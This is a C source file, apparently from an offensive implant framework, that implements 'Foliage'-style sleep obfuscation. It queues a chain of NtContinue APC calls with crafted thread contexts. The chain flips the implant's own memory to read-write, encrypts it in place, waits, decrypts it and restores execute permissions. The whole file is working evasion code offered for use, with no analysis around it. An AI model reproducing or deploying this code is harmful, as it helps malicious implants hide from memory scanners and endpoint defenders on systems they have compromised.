#include <Utils.h>
#include <Common.h>

#define PrintErr( x, z ); Instance()->Win32.printf( "[E] %s failed with err %d\n", x, z );

FUNC VOID volatile ___chkstk_ms(
        VOID
) { __asm__( "nop" ); }

FUNC VOID FoliageObf( 
    DWORD SleepTime
) {
    BLACKOUT_INSTANCE
    
    LONG   Status     = 0x00;

    HANDLE EvtSync     = NULL;
    HANDLE hSlpThread  = NULL;
    HANDLE hMainThread = NULL;

    PVOID  OldProt    = NULL;

    CONTEXT CtxMain   = { 0 };

    CONTEXT RopSetEvt = { 0 };
    CONTEXT RopProtRw = { 0 };
    CONTEXT RopMemEnc = { 0 };
    CONTEXT RopDelay  = { 0 };
    CONTEXT RopMemDec = { 0 };
    CONTEXT RopProtRx = { 0 };
    CONTEXT RopExit   = { 0 };

    Status = Instance()->Win32.NtCreateEvent( &EvtSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
    if ( Status != 0x00 ) {
        PrintErr( "NtCreateEvent", Status );
    }    

    Status = Instance()->Win32.NtCreateThreadEx( &hSlpThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL );
    if ( Status != 0x00 ) {
        PrintErr( "NtCreateThreadEx", Status );
    }

    Instance()->Win32.printf( "[I] Obf chain thread at tid: %d\n", hSlpThread );

    CtxMain.ContextFlags = CONTEXT_FULL;
    Status = Instance()->Win32.NtGetContextThread( hSlpThread, &CtxMain );
    if ( Status != 0x00 ) {
        PrintErr( "NtGetContextThread", Status );
    }

    *(PVOID*)CtxMain.Rsp = Instance()->Win32.NtTestAlert;

    MmCopy( &RopSetEvt, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopProtRw, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopMemEnc, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopDelay,  &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopMemDec, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopProtRx, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopExit,   &CtxMain, sizeof( CONTEXT ) );

    /* 
     * wait EvtSync gets triggered
     * NtWaitForGingleObject( EvtSync, FALSE, NULL ); 
     */
    RopSetEvt.Rip = Instance()->Win32.NtWaitForSingleObject;
    RopSetEvt.Rcx = EvtSync;
    RopSetEvt.Rdx = FALSE;
    RopSetEvt.R9  = NULL;

    /*
     * Change implant protection to RW
     * VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProt ); 
     */
    RopProtRw.Rip = Instance()->Win32.VirtualProtect;
    RopProtRw.Rcx = Instance()->Base.Buffer;
    RopProtRw.Rdx = Instance()->Base.Length;
    RopProtRw.R8  = PAGE_READWRITE;
    RopProtRw.R9  = &OldProt;

    /*
     * memory encryption
     * SystemFunction( &Img, &Key );
     */
    RopMemEnc.Rip = Instance()->Win32.SystemFunction040;
    RopMemEnc.Rcx = Instance()->Base.Buffer;
    RopMemEnc.Rdx = Instance()->Base.Length;

    /*
     * delay
     * WaitForSingleObjectEx( NtCurrentProcess(), SleepTime, FALSE );
     */
    RopDelay.Rip = Instance()->Win32.WaitForSingleObjectEx;
    RopDelay.Rcx = NtCurrentProcess();
    RopDelay.Rdx = SleepTime;
    RopDelay.R8  = FALSE;

    /*
     * memory decryption
     * SystemFunction( &Img, &Key );
     */
    RopMemDec.Rip = Instance()->Win32.SystemFunction041;
    RopMemDec.Rcx = Instance()->Base.Buffer;
    RopMemDec.Rdx = Instance()->Base.Length;

    /*
     * change memory to execute and read
     * VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READ, &oldProt );
     */
    RopProtRx.Rip = Instance()->Win32.VirtualProtect;
    RopProtRx.Rcx = Instance()->Base.Buffer;
    RopProtRx.Rdx = Instance()->Base.Length;
    RopProtRx.R8  = PAGE_EXECUTE_READ;
    RopProtRx.R9  = &OldProt;

    /*
     * exit thread
     * RtlExitUserThread( 0x00 );
     */
    RopExit.Rip = Instance()->Win32.RtlExitUserThread;
    RopExit.Rcx = 0x00;

    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopSetEvt, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRw, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopMemEnc, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopDelay , FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopMemDec, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRx, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopExit  , FALSE, NULL );

    Status = Instance()->Win32.NtAlertResumeThread( hSlpThread, NULL );
    if ( Status != 0x00 ) {
        PrintErr( "NtAlertResumeThread", Status );
    }

    Instance()->Win32.printf( "[I] Trigger sleep obf chain\n\n" );

    Status = Instance()->Win32.NtSignalAndWaitForSingleObject( EvtSync, hSlpThread, TRUE, NULL );
    if ( Status != 0x00 ) {
        PrintErr( "NtSignalAndWaitForSingleObject", Status );
    }

_LeaveObf:
    if ( EvtSync ) {
        Instance()->Win32.CloseHandle( EvtSync );
        EvtSync = NULL;
    }

    if ( hSlpThread ) {
        Instance()->Win32.CloseHandle( hSlpThread );
        hSlpThread = NULL;
    }
}    

